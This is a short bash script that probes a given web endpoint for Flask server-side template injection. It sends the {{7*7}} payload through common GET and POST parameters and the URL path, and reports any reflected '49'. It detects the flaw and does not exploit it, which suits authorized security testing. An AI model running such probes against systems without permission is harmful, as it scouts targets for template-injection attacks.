#!/bin/bash
# Flask SSTI — Probe for SSTI injection points in GET/POST params and path
# Usage: probe_ssti.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

# Test GET parameters
for param in name user input q search query text msg content data value cmd; do
  result=$(curl -s -G --data-urlencode "${param}={{7*7}}" "$ENDPOINT" --max-time 8 2>/dev/null)
  if echo "$result" | grep -q "49"; then
    echo "SSTI_FOUND:GET:${param}"
    break
  fi
done

# Also test path reflection
result=$(curl -s "${ENDPOINT}/{{7*7}}" --max-time 8 2>/dev/null)
if echo "$result" | grep -q "49"; then
  echo "SSTI_FOUND:PATH:/"
fi

# Test POST parameters
for param in name user input q content data; do
  result=$(curl -s -X POST "$ENDPOINT" --data-urlencode "${param}={{7*7}}" --max-time 8 2>/dev/null)
  if echo "$result" | grep -q "49"; then
    echo "SSTI_POST_FOUND:${param}"
    break
  fi
done
